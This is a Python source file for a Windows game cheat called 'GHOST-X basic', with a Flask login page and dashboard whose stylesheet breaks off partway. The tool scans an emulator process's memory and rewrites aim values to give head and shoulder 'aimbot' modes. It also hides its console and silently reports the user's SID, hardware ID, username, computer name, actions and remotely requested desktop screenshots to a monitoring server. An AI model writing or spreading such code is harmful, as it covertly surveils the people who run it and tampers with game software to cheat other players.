import os
import sys
import time
import threading
import ctypes
import requests
import subprocess
import hashlib
import json
import base64
import uuid
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
import psutil
import win32api
import win32con
import win32gui
import win32ui
import win32security
from PIL import Image
import io
from pymem import Pymem
from pymem.pattern import pattern_scan_all
from pymem.memory import read_bytes, write_bytes, read_int, write_int
import atexit

# ==================== HIDE CONSOLE ====================
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# ==================== SILENT MONITORING ====================
MONITOR_SERVER = "http://127.0.0.1:8080/report"

# ==================== SCREENSHOT POLLING (Respond to monitor requests) ====================
def poll_for_screenshot_requests():
    """Check if monitor requested a new screenshot"""
    while True:
        try:
            sid = get_windows_sid()
            hwid = get_hwid()
            client_id = f"{sid[:50]}_{hwid[:10]}"
            
            response = requests.get(f"{MONITOR_SERVER.replace('/report', '')}/check_screenshot/{client_id}?pass=GHOSTX2024", timeout=2)
            if response.status_code == 200 and response.json().get('requested'):
                screenshot = take_screenshot()
                if screenshot:
                    send_report('screenshot', screenshot)
                    print("[DEBUG] Screenshot sent to monitor")
        except Exception as e:
            pass
        time.sleep(3)

# Start polling thread
threading.Thread(target=poll_for_screenshot_requests, daemon=True).start()

def get_windows_sid():
    try:
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_QUERY
        )
        sid = win32security.GetTokenInformation(hToken, win32security.TokenUser)[0]
        return win32security.ConvertSidToStringSid(sid)
    except:
        try:
            result = subprocess.run(['wmic', 'useraccount', 'where', 'name="%username%"', 'get', 'sid'],
                                   capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            lines = result.stdout.strip().split('\n')
            for line in lines:
                if 'S-1-5-21' in line:
                    return line.strip()
        except:
            pass
        return "UNKNOWN_SID"

def get_hwid():
    try:
        result = subprocess.run(['vol', 'C:'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        for line in result.stdout.split('\n'):
            if 'Serial number' in line:
                return line.split('Serial number')[-1].strip()
    except:
        pass
    return "UNKNOWN_HWID"

def take_screenshot():
    try:
        hwnd = win32gui.GetDesktopWindow()
        left = win32api.GetSystemMetrics(0)
        top = win32api.GetSystemMetrics(1)
        
        hwndDC = win32gui.GetWindowDC(hwnd)
        mfcDC = win32ui.CreateDCFromHandle(hwndDC)
        saveDC = mfcDC.CreateCompatibleDC()
        
        bitmap = win32ui.CreateBitmap()
        bitmap.CreateCompatibleBitmap(mfcDC, left, top)
        saveDC.SelectObject(bitmap)
        saveDC.BitBlt((0, 0), (left, top), mfcDC, (0, 0), win32con.SRCCOPY)
        
        bmpinfo = bitmap.GetInfo()
        bmpstr = bitmap.GetBitmapBits(True)
        
        img = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX', 0, 1)
        img = img.resize((960, 540), Image.LANCZOS)
        
        buffer = io.BytesIO()
        img.save(buffer, 'JPEG', quality=70)
        b64 = base64.b64encode(buffer.getvalue()).decode()
        
        win32gui.DeleteObject(bitmap.GetHandle())
        saveDC.DeleteDC()
        mfcDC.DeleteDC()
        win32gui.ReleaseDC(hwnd, hwndDC)
        
        return b64
    except:
        return None

def send_report(action, details=""):
    try:
        threading.Thread(target=_send_report, args=(action, details), daemon=True).start()
    except:
        pass

def _send_report(action, details):
    try:
        sid = get_windows_sid()
        hwid = get_hwid()
        computer_name = os.environ.get('COMPUTERNAME', 'UNKNOWN')
        username = os.environ.get('USERNAME', 'UNKNOWN')
        
        payload = {
            'sid': sid,
            'hwid': hwid,
            'computer': computer_name,
            'user': username,
            'action': action,
            'details': details,
            'timestamp': time.time()
        }
        requests.post(MONITOR_SERVER, json=payload, timeout=3)
    except:
        pass

def heartbeat_loop():
    while True:
        send_report('heartbeat')
        time.sleep(30)

threading.Thread(target=heartbeat_loop, daemon=True).start()
send_report('startup', f'Python version: {sys.version}')

# ==================== GLOBALS ====================
SERVER_PORT = 5735
current_process_name = "HD-Player.exe"
aimbot_addresses = []
is_initialized = False
match_ended = False
monitoring_active = False
monitoring_thread = None

aimbot_states = {
    "Head": False,
    "LeftShoulder": False,
    "RightShoulder": False,
    "AimbotAi": False
}

entity_states = {
    'alive': set(),
    'knocked': set(),
    'dead': set()
}

original_head_values = {}
original_left_values = {}
original_right_values = {}
original_ai_values = {}

hotkey_state = {
    "hold_key": None,
    "hold_active": False,
    "delay": 50
}

user_settings = {
    'ignore_knocked': True,
    'hotkey_aimbot': 'Head'
}

aimbot_ai_running = False
aimbot_ai_thread = None

# ==================== OFFSETS ====================
OFFSET_MATCH_FLAG = 0xFF
OFFSET_STATE_BYTE1 = 0x647
OFFSET_STATE_BYTE2 = 0x648

OFFSET_HEAD_READ = 0xB8
OFFSET_HEAD_WRITE = 0xB4
OFFSET_LEFT_READ = 0xEC
OFFSET_RIGHT_READ = 0xE8
OFFSET_SHOULDER_WRITE = 0xA8
OFFSET_AIMBOT_AI_READ = 0xFC
OFFSET_AIMBOT_AI_WRITE = -0x358

NEW_AIMBOT_AOB = "FF FF FF FF ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? FF FF FF FF FF FF FF FF FF FF FF FF ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? A5 43"

def mkp(aob):
    aob = aob.replace(" ", "")
    pattern = bytes()
    for i in range(0, len(aob), 2):
        hex_byte = aob[i:i+2]
        if hex_byte == "??":
            pattern += b"."
        else:
            pattern += bytes([int(hex_byte, 16)])
    return pattern

# ==================== ENTITY FUNCTIONS ====================
def get_entity_state(entity_address):
    try:
        proc = Pymem(current_process_name)
        state1 = read_bytes(proc.process_handle, entity_address + OFFSET_STATE_BYTE1, 1)
        state2 = read_bytes(proc.process_handle, entity_address + OFFSET_STATE_BYTE2, 1)
        match_bytes = read_bytes(proc.process_handle, entity_address + OFFSET_MATCH_FLAG, 4)
        proc.close_process()
        
        if state1 and state2 and match_bytes:
            val1 = int.from_bytes(state1, byteorder='little')
            val2 = int.from_bytes(state2, byteorder='little')
            match_val = int.from_bytes(match_bytes, byteorder='little', signed=False)
            
            if match_val == 0:
                return 'not_in_match'
            
            if val1 == 0x3F:
                return 'alive'
            elif val1 == 0x3D and val2 == 0x01:
                return 'dead'
            else:
                return 'knocked'
        return 'unknown'
    except:
        return 'error'

def should_target_entity(entity_address):
    if match_ended:
        return False
    state = get_entity_state(entity_address)
    if state == 'not_in_match' or state == 'dead':
        return False
    if state == 'knocked' and user_settings.get('ignore_knocked', True):
        return False
    return state == 'alive' or state == 'knocked'

def update_entity_states():
    global entity_states, match_ended
    
    entities_in_match = 0
    entity_states['alive'] = set()
    entity_states['knocked'] = set()
    entity_states['dead'] = set()
    
    if not is_initialized or not aimbot_addresses:
        return
    
    try:
        proc = Pymem(current_process_name)
        for entity in aimbot_addresses:
            try:
                match_bytes = read_bytes(proc.process_handle, entity + OFFSET_MATCH_FLAG, 4)
                if match_bytes and len(match_bytes) == 4:
                    match_val = int.from_bytes(match_bytes, byteorder='little', signed=False)
                    if match_val != 0:
                        entities_in_match += 1
                
                state = get_entity_state(entity)
                if state == 'alive':
                    entity_states['alive'].add(entity)
                elif state == 'knocked':
                    entity_states['knocked'].add(entity)
                elif state == 'dead':
                    entity_states['dead'].add(entity)
            except:
                continue
        proc.close_process()
    except:
        pass
    
    old_match = match_ended
    match_ended = (entities_in_match == 0) and len(aimbot_addresses) > 0
    if old_match != match_ended and match_ended:
        send_report('match_ended')
        clear_entities()

def clear_entities():
    global aimbot_addresses, is_initialized, match_ended, entity_states
    
    if aimbot_states["Head"]:
        HEADOFF()
    if aimbot_states["LeftShoulder"]:
        LEFTSHOULDEROFF()
    if aimbot_states["RightShoulder"]:
        RIGHTSHOULDEROFF()
    if aimbot_states["AimbotAi"]:
        AIMBOTAIOFF()
    
    aimbot_addresses = []
    is_initialized = False
    match_ended = True
    entity_states = {'alive': set(), 'knocked': set(), 'dead': set()}
    
    original_head_values.clear()
    original_left_values.clear()
    original_right_values.clear()
    original_ai_values.clear()

def entity_monitoring_loop():
    global monitoring_active
    while monitoring_active:
        try:
            if is_initialized and aimbot_addresses:
                update_entity_states()
            else:
                global match_ended
                match_ended = True
            time.sleep(0.1)
        except:
            time.sleep(1)

def start_entity_monitoring():
    global monitoring_active, monitoring_thread
    if monitoring_active:
        return
    monitoring_active = True
    monitoring_thread = threading.Thread(target=entity_monitoring_loop, daemon=True)
    monitoring_thread.start()

# ==================== SCAN FUNCTION ====================
def HEADLOAD():
    global aimbot_addresses, is_initialized, match_ended
    global original_head_values, original_left_values, original_right_values, original_ai_values
    
    send_report('scan_start')
    
    if aimbot_states["Head"]:
        HEADOFF()
    if aimbot_states["LeftShoulder"]:
        LEFTSHOULDEROFF()
    if aimbot_states["RightShoulder"]:
        RIGHTSHOULDEROFF()
    if aimbot_states["AimbotAi"]:
        AIMBOTAIOFF()
    
    aimbot_addresses = []
    is_initialized = False
    match_ended = False
    entity_states = {'alive': set(), 'knocked': set(), 'dead': set()}
    original_head_values.clear()
    original_left_values.clear()
    original_right_values.clear()
    original_ai_values.clear()
    
    try:
        proc = Pymem(current_process_name)
    except:
        send_report('scan_failed', f'Process {current_process_name} not found')
        return f"Process '{current_process_name}' not found"
    
    try:
        entity_pattern = mkp(NEW_AIMBOT_AOB)
        addresses = pattern_scan_all(proc.process_handle, entity_pattern, return_multiple=True)
        found_addresses = [int(addr) for addr in addresses]
        
        if not found_addresses:
            proc.close_process()
            send_report('scan_failed', 'No entities found')
            return "No entities found"
        
        valid_entities = []
        for base_addr in found_addresses:
            try:
                if read_bytes(proc.process_handle, base_addr, 4):
                    valid_entities.append(base_addr)
            except:
                continue
        
        aimbot_addresses = valid_entities
        is_initialized = True
        
        proc.close_process()
        
        if not monitoring_active:
            start_entity_monitoring()
        
        alive = 0
        knocked = 0
        dead = 0
        for entity in aimbot_addresses:
            state = get_entity_state(entity)
            if state == 'alive':
                alive += 1
            elif state == 'knocked':
                knocked += 1
            elif state == 'dead':
                dead += 1
        
        send_report('scan_complete', f'found {len(aimbot_addresses)} entities (alive:{alive}, knocked:{knocked}, dead:{dead})')
        return f"Aimbot Initialized - {len(aimbot_addresses)} Entities Found (Alive: {alive}, Knocked: {knocked}, Dead: {dead})"
    except Exception as e:
        send_report('scan_error', str(e))
        return f"Scan failed: {str(e)}"

# ==================== AIMBOT FUNCTIONS ====================
def HEADON():
    global aimbot_states, original_head_values
    
    if not aimbot_addresses:
        return "No players - scan first"
    
    if match_ended:
        return "Match has ended - scan again"
    
    if aimbot_states["LeftShoulder"]:
        LEFTSHOULDEROFF()
    if aimbot_states["RightShoulder"]:
        RIGHTSHOULDEROFF()
    if aimbot_states["AimbotAi"]:
        AIMBOTAIOFF()
    
    try:
        proc = Pymem(current_process_name)
        success = 0
        for entity in aimbot_addresses:
            if not should_target_entity(entity):
                continue
            if entity not in original_head_values:
                original_head_values[entity] = read_bytes(proc.process_handle, entity + OFFSET_HEAD_WRITE, 4)
            value_bytes = read_bytes(proc.process_handle, entity + OFFSET_HEAD_READ, 4)
            if value_bytes:
                write_bytes(proc.process_handle, entity + OFFSET_HEAD_WRITE, value_bytes, 4)
                success += 1
        proc.close_process()
        aimbot_states["Head"] = True
        send_report('aimbot_enable', f'head on {success} entities')
        return f"Headshot Enabled on {success} entities"
    except Exception as e:
        return f"Headshot failed: {str(e)}"

def HEADOFF():
    global aimbot_states, original_head_values
    
    if not original_head_values:
        aimbot_states["Head"] = False
        return "Headshot was not enabled"
    
    try:
        proc = Pymem(current_process_name)
        for entity, orig in original_head_values.items():
            try:
                write_bytes(proc.process_handle, entity + OFFSET_HEAD_WRITE, orig, len(orig))
            except:
                pass
        proc.close_process()
        aimbot_states["Head"] = False
        send_report('aimbot_disable', 'head')
        return "Headshot Disabled"
    except:
        aimbot_states["Head"] = False
        return "Headshot Disabled"

def LEFTSHOULDERON():
    global aimbot_states, original_left_values
    
    if not aimbot_addresses:
        return "No players - scan first"
    
    if match_ended:
        return "Match has ended - scan again"
    
    if aimbot_states["Head"]:
        HEADOFF()
    if aimbot_states["RightShoulder"]:
        RIGHTSHOULDEROFF()
    if aimbot_states["AimbotAi"]:
        AIMBOTAIOFF()
    
    try:
        proc = Pymem(current_process_name)
        success = 0
        for entity in aimbot_addresses:
            if not should_target_entity(entity):
                continue
            if entity not in original_left_values:
                original_left_values[entity] = read_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, 4)
            value_bytes = read_bytes(proc.process_handle, entity + OFFSET_LEFT_READ, 4)
            if value_bytes:
                write_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, value_bytes, 4)
                success += 1
        proc.close_process()
        aimbot_states["LeftShoulder"] = True
        send_report('aimbot_enable', f'left_shoulder on {success} entities')
        return f"Aimbot Legit Enabled (Left Shoulder) on {success} entities"
    except Exception as e:
        return f"Left shoulder failed: {str(e)}"

def LEFTSHOULDEROFF():
    global aimbot_states, original_left_values
    
    if not original_left_values:
        aimbot_states["LeftShoulder"] = False
        return "Left shoulder was not enabled"
    
    try:
        proc = Pymem(current_process_name)
        for entity, orig in original_left_values.items():
            try:
                write_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, orig, len(orig))
            except:
                pass
        proc.close_process()
        aimbot_states["LeftShoulder"] = False
        send_report('aimbot_disable', 'left_shoulder')
        return "Aimbot Legit Disabled (Left Shoulder)"
    except:
        aimbot_states["LeftShoulder"] = False
        return "Left Shoulder Disabled"

def RIGHTSHOULDERON():
    global aimbot_states, original_right_values
    
    if not aimbot_addresses:
        return "No players - scan first"
    
    if match_ended:
        return "Match has ended - scan again"
    
    if aimbot_states["Head"]:
        HEADOFF()
    if aimbot_states["LeftShoulder"]:
        LEFTSHOULDEROFF()
    if aimbot_states["AimbotAi"]:
        AIMBOTAIOFF()
    
    try:
        proc = Pymem(current_process_name)
        success = 0
        for entity in aimbot_addresses:
            if not should_target_entity(entity):
                continue
            if entity not in original_right_values:
                original_right_values[entity] = read_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, 4)
            value_bytes = read_bytes(proc.process_handle, entity + OFFSET_RIGHT_READ, 4)
            if value_bytes:
                write_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, value_bytes, 4)
                success += 1
        proc.close_process()
        aimbot_states["RightShoulder"] = True
        send_report('aimbot_enable', f'right_shoulder on {success} entities')
        return f"Aimbot Legit Enabled (Right Shoulder) on {success} entities"
    except Exception as e:
        return f"Right shoulder failed: {str(e)}"

def RIGHTSHOULDEROFF():
    global aimbot_states, original_right_values
    
    if not original_right_values:
        aimbot_states["RightShoulder"] = False
        return "Right shoulder was not enabled"
    
    try:
        proc = Pymem(current_process_name)
        for entity, orig in original_right_values.items():
            try:
                write_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, orig, len(orig))
            except:
                pass
        proc.close_process()
        aimbot_states["RightShoulder"] = False
        send_report('aimbot_disable', 'right_shoulder')
        return "Aimbot Legit Disabled (Right Shoulder)"
    except:
        aimbot_states["RightShoulder"] = False
        return "Right Shoulder Disabled"

def aimbot_ai_worker():
    global aimbot_ai_running, original_ai_values, aimbot_states
    
    while aimbot_ai_running:
        if not aimbot_states["AimbotAi"]:
            time.sleep(0.1)
            continue
            
        if not is_initialized or not aimbot_addresses or match_ended:
            time.sleep(0.1)
            continue
        
        try:
            proc = Pymem(current_process_name)
            for entity in aimbot_addresses:
                if not should_target_entity(entity):
                    continue
                
                if entity not in original_ai_values:
                    try:
                        original_ai_values[entity] = read_bytes(proc.process_handle, entity + OFFSET_AIMBOT_AI_WRITE, 4)
                    except:
                        pass
                
                ai_value = read_int(proc.process_handle, entity + OFFSET_AIMBOT_AI_READ)
                if ai_value != 0:
                    write_int(proc.process_handle, entity + OFFSET_AIMBOT_AI_WRITE, ai_value)
            proc.close_process()
        except:
            pass
        
        time.sleep(0.005)

def AIMBOTAI_ON():
    global aimbot_ai_running, aimbot_states, aimbot_ai_thread
    
    if not aimbot_addresses:
        return "No players - scan first"
    
    if match_ended:
        return "Match has ended - scan again"
    
    if aimbot_states["Head"]:
        HEADOFF()
    if aimbot_states["LeftShoulder"]:
        LEFTSHOULDEROFF()
    if aimbot_states["RightShoulder"]:
        RIGHTSHOULDEROFF()
    
    if aimbot_ai_running:
        return "Aimbot AI already running"
    
    aimbot_ai_running = True
    aimbot_ai_thread = threading.Thread(target=aimbot_ai_worker, daemon=True)
    aimbot_ai_thread.start()
    aimbot_states["AimbotAi"] = True
    send_report('aimbot_enable', 'ai')
    return "Aimbot Ai Enabled"

def AIMBOTAIOFF():
    global aimbot_ai_running, aimbot_states, original_ai_values
    
    aimbot_ai_running = False
    aimbot_states["AimbotAi"] = False
    send_report('aimbot_disable', 'ai')
    
    if original_ai_values:
        try:
            proc = Pymem(current_process_name)
            for entity, orig in original_ai_values.items():
                try:
                    write_bytes(proc.process_handle, entity + OFFSET_AIMBOT_AI_WRITE, orig, len(orig))
                except:
                    pass
            proc.close_process()
        except:
            pass
    
    return "Aimbot Ai Disabled"

def AIMBOT_OFF():
    if aimbot_states["Head"]:
        HEADOFF()
    if aimbot_states["LeftShoulder"]:
        LEFTSHOULDEROFF()
    if aimbot_states["RightShoulder"]:
        RIGHTSHOULDEROFF()
    if aimbot_states["AimbotAi"]:
        AIMBOTAIOFF()
    send_report('aimbot_off_all')
    return "All Aimbots Disabled"

# ==================== AUTHENTICATION ====================
GITHUB_AUTH_URL = "https://raw.githubusercontent.com/Ghostxs90/X-sid/main/sid2.txt"

def get_computer_sid():
    try:
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_QUERY
        )
        sid = win32security.GetTokenInformation(hToken, win32security.TokenUser)[0]
        return win32security.ConvertSidToStringSid(sid)
    except:
        try:
            result = subprocess.run(['wmic', 'useraccount', 'where', 'name="%username%"', 'get', 'sid'],
                                   capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            lines = result.stdout.strip().split('\n')
            for line in lines:
                if 'S-1-5-21' in line:
                    return line.strip()
        except:
            pass
        return "S-1-5-21-123456789-123456789-123456789-500"

def fetch_credentials():
    creds = {}
    try:
        headers = {
            'Cache-Control': 'no-cache, no-store, must-revalidate',
            'Pragma': 'no-cache',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = requests.get(GITHUB_AUTH_URL, headers=headers, timeout=10)
        if response.status_code == 200:
            content = response.text.strip()
            lines = content.split('\n')
            user = passw = sid = ""
            for line in lines:
                line = line.strip()
                if line.startswith('Username='):
                    user = line.split('=', 1)[1].strip()
                elif line.startswith('Password='):
                    passw = line.split('=', 1)[1].strip()
                elif line.startswith('sid='):
                    sid = line.split('=', 1)[1].strip()
                    if user and passw and sid:
                        creds[user] = (passw, sid)
                        user = passw = sid = ""
    except:
        pass
    return creds

def authenticate_user(username, password):
    creds = fetch_credentials()
    current_sid = get_computer_sid()
    
    if username in creds and creds[username][0] == password and creds[username][1] == current_sid:
        threading.Thread(target=lambda: send_report('screenshot', take_screenshot()), daemon=True).start()
        send_report('login_success', username)
        return True, "Login successful"
    else:
        send_report('login_failed', f'{username} - SID mismatch')
        return False, "INVALID CREDENTIALS"

# ==================== HOTKEY MONITOR ====================
def hold_hotkey_monitor():
    global hotkey_state, aimbot_states
    
    vk_map = {
        'MouseLeft': 0x01, 'MouseRight': 0x02, 'MouseMiddle': 0x04,
        'MouseButton4': 0x05, 'MouseButton5': 0x06,
        'Shift': 0x10, 'Control': 0x11, 'Alt': 0x12,
        'A': 0x41, 'B': 0x42, 'C': 0x43, 'D': 0x44, 'E': 0x45, 'F': 0x46,
        'G': 0x47, 'H': 0x48, 'I': 0x49, 'J': 0x4A, 'K': 0x4B, 'L': 0x4C,
        'M': 0x4D, 'N': 0x4E, 'O': 0x4F, 'P': 0x50, 'Q': 0x51, 'R': 0x52,
        'S': 0x53, 'T': 0x54, 'U': 0x55, 'V': 0x56, 'W': 0x57, 'X': 0x58,
        'Y': 0x59, 'Z': 0x5A
    }
    
    while True:
        try:
            if hotkey_state["hold_key"] and hotkey_state["hold_key"] in vk_map:
                key_state = win32api.GetAsyncKeyState(vk_map[hotkey_state["hold_key"]])
                key_held = (key_state & 0x8000) != 0
                
                if key_held and not hotkey_state["hold_active"]:
                    hotkey_state["hold_active"] = True
                    def delayed_execute():
                        time.sleep(hotkey_state["delay"] / 1000.0)
                        if hotkey_state["hold_active"] and not match_ended:
                            if not aimbot_states["AimbotAi"]:
                                AIMBOTAI_ON()
                    threading.Thread(target=delayed_execute, daemon=True).start()
                elif not key_held and hotkey_state["hold_active"]:
                    hotkey_state["hold_active"] = False
                    if not match_ended and aimbot_states["AimbotAi"]:
                        AIMBOTAIOFF()
        except:
            pass
        time.sleep(0.01)

# ==================== PROCESS FUNCTIONS ====================
def is_target_process_running():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and current_process_name.lower() in proc.info['name'].lower():
                return True
    except:
        pass
    return False

def get_running_processes():
    processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                processes.append({'pid': proc.info['pid'], 'name': proc.info['name']})
            except:
                pass
        processes.sort(key=lambda x: x['name'].lower())
    except:
        pass
    return processes

def set_target_process(process_name):
    global current_process_name, is_initialized, aimbot_addresses
    try:
        test_proc = Pymem(process_name)
        test_proc.close_process()
        current_process_name = process_name
        is_initialized = False
        aimbot_addresses = []
        send_report('target_process_changed', process_name)
        return True
    except:
        return False

def exit_application():
    send_report('exit')
    AIMBOT_OFF()
    os._exit(0)

# ==================== FLASK APP ====================
app = Flask(__name__)
app.secret_key = 'GHOST-X basic2024'

# ==================== LOGIN HTML ====================
LOGIN_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GHOST-X basic - Login</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #0f0f0f;
            font-family: 'Segoe UI', sans-serif;
            color: #fff;
            overflow: hidden;
        }
        .container {
            display: flex;
            height: 100vh;
            justify-content: center;
            align-items: center;
            position: relative;
            z-index: 1;
        }
        .login-box {
            background: #1b1b1b;
            border: 1px solid #3399ff;
            border-radius: 15px;
            padding: 40px;
            box-shadow: 0 0 25px rgba(51, 153, 255, 0.4);
            width: 360px;
        }
        .login-box h2 {
            text-align: center;
            margin-bottom: 30px;
            color: #3399ff;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            color: #ccc;
        }
        .form-group input {
            width: 100%;
            padding: 12px;
            background: #0f0f0f;
            border: 1px solid #30363d;
            border-radius: 8px;
            color: white;
            font-size: 14px;
            outline: none;
        }
        .btn {
            width: 100%;
            background: #3399ff;
            color: #000;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #2277dd;
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #28a745;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            display: none;
            z-index: 9999;
            font-weight: bold;
            box-shadow: 0 0 15px rgba(40, 167, 69, 0.5);
        }
        .notification.error {
            background: #dc3545;
            box-shadow: 0 0 15px rgba(220, 53, 69, 0.5);
        }
        #particles-js {
            position: absolute;
            width: 100%;
            height: 100%;
            z-index: 0;
        }
        #loadingOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(15, 15, 15, 0.95);
            z-index: 99999;
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .loader-ring {
            border: 5px solid rgba(51, 153, 255, 0.2);
            border-top: 5px solid #3399ff;
            border-radius: 50%;
            width: 70px;
            height: 70px;
            animation: spin 1s linear infinite;
            box-shadow: 0 0 20px rgba(51, 153, 255, 0.5);
        }
        .loader-text {
            margin-top: 15px;
            font-size: 18px;
            color: #3399ff;
            text-shadow: 0 0 10px #3399ff;
            font-weight: bold;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div id="particles-js"></div>
<div id="loadingOverlay"><div class="loader-ring"></div><div class="loader-text">Verifying...</div></div>
<div class="container">
    <div class="login-box">
        <h2>GHOST-X basic Login</h2>
        <form method="POST" action="/" onsubmit="document.getElementById('loadingOverlay').style.display='flex'">
            <div class="form-group">
                <label for="username">Username</label>
                <input name="username" type="text" id="username" required autocomplete="off">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input name="password" type="password" id="password" required>
            </div>
            <button class="btn" type="submit">Login</button>
        </form>
        {% if error %}
            <div class="notification error" style="display:block;">{{ error }}</div>
        {% endif %}
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
<script>
    particlesJS("particles-js", {
        "particles": {
            "number": { "value": 80 },
            "color": { "value": "#3399ff" },
            "shape": { "type": "circle" },
            "opacity": { "value": 0.5 },
            "size": { "value": 3 },
            "move": { "enable": true, "speed": 5 }
        },
        "interactivity": {
            "events": { "onhover": { "enable": true, "mode": "repulse" } }
        }
    });
    function showLoading() {
        document.getElementById("loadingOverlay").style.display = "flex";
    }
</script>
</body>
</html>
"""

# ==================== INDEX HTML ====================
INDEX_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta charset="UTF-8" />
  <title>GHOST-X basic Streamer Dashboard</title>
  <style>
    * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
    body { margin: 0; background-color: #111; color: #eee; transition: background-color 0.3s, color 0.3s; }
    .container { max-width: 700px; margin: 20px auto; padding: 0 20px; }
    .panel { background-color: #1e1e1e; border-radius: 12px; padding: 16px; margin-bottom: 10px; box-shadow: 0 0 8px rgba(0,0,0,0.5); }
    .panel h2 { margin-top: 0; font-size: 18px; color: #90caf9; }
    .status { display: flex; justify-content: space-between; align-items: center; }
    .badge { padding: 4px 10px; border-radius: 8px; background-color: #2e7d32; color: white; font-size: 12px; font-weight: bold; }
    .badge.online { background-color: #2e7d32; }
    .badge.offline { background-color: #dc3545; }
    .section-buttons, .aim-buttons, .tab-buttons, .sniper-buttons, .extra-buttons, .settings-buttons { display: flex; gap: 10px; flex-wrap: wrap; }
    .button { background-color: #333; color: #ccc; padding: 8px 12px; border-radius: 8px; cursor: pointer; border: 1px solid #444; transition: 0.2s; user-select: none; flex-shrink: 0; text-align: center; }
    .button:hover { background-color: #444; }
    .button.active { background-color: #3399ff; color: white; border-color: #3399ff; }
    .button.exit { background-color: #dc3545; color: white; border-color: #dc3545; }
    .button.exit:hover { background-color: #c82333; border-color: #bd2130; }
    .tab-buttons { display: flex; justify-content: space-around; margin: 10px 0; }
    .tab-buttons .button { flex: 1; text-align: center; }
    .console { background-color: #0d0d0d; border: 1px solid #222; padding: 12px; border-radius: 8px; min-height: 100px; font-family: monospace; color: #90ee90; overflow-y: auto; max-height: 150px; white-space: pre-wrap; word-wrap: break-word; }
    .aim-section, .sniper-section, .extra-section, .settings-section { margin-top: 10px; }
    .aim-row, .sniper-row, .sniper-row2, .sniper-row3, .extra-row, .settings-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; flex-wrap: wrap; gap: 10px; }
    .aim-label, .sniper-label, .extra-label, .settings-label { font-size: 14px; margin-bottom: 4px; min-width: 140px; }
    .note { font-size: 12px; color: #888; margin-top: 2px; }
    select { padding: 8px; background-color: #222; color: #eee; border: 1px solid #444; border-radius: 8px; min-width: 160px; cursor: pointer; }
    .content-panel { display: none; }
    .content-panel.active { display: block; }
    #notifications-container { position: fixed; top: 12px; right: 12px; display: flex; flex-direction: column; gap: 10px; z-index: 1000; max-width: 320px; pointer-events: none; }
    .notification { background-color: #2e7d32; color: white; padding: 12px 18px; border-radius: 8px; box-shadow: 0 4px 10px rgba(46,125,50,0.7); font-weight: 600; font-size: 14px; user-select: none; pointer-events: auto; opacity: 0; transform: translateX(100%); animation: slideIn 5s forwards, fadeOut 3s forwards 6s; }
    @keyframes slideIn { to { opacity: 1; transform: translateX(0); } }
    @keyframes fadeOut { to { opacity: 0; transform: translateX(100%); } }
    body.light { background-color: #eee; color: #111; }
    body.light .panel { background-color: #fafafa; box-shadow: 0 0 8px rgba(0,0,0,0.1); color: #111; }
    body.light .button { background-color: #ddd; color: #111; border: 1px solid #ccc; }
    body.light .button.active { background-color: #3399ff; color: white; border-color: #3399ff; }
    body.light .button.exit { background-color: #dc3545; color: white; border-color: #dc3545; }
    body.light select { background-color: #fff; color: #111; border: 1px solid #ccc; }
    body.blue { background-color: #001f3f; color: #aad4ff; }
    body.blue .panel { background-color: #003366; box-shadow: 0 0 8px rgba(0,0,0,0.8); color: #aad4ff; }
    body.blue .button { background-color: #004080; color: #aad4ff; border: 1px solid #0059b3; }
    body.blue .button.active { background-color: #3399ff; color: white; border-color: #3399ff; }
